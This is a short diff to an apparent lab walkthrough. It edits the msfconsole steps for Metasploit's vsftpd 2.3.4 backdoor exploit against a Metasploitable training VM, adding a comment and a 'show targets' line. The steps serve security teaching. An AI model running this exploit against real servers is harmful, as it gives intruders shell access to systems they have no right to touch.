@@ -17,7 +17,8 @@ The version is vsftpd_234_backdoor
 Open metasploit in Kali.
 Enter the following commands:
 use exploit/unix/ftp/vsftpd_234_backdoor
-show targets(Doesn’t work!)
+// the following commands will be in msfconsole:.
+show targets
 show options
 set RHOST (IP address of Metasploitable)
 exploit
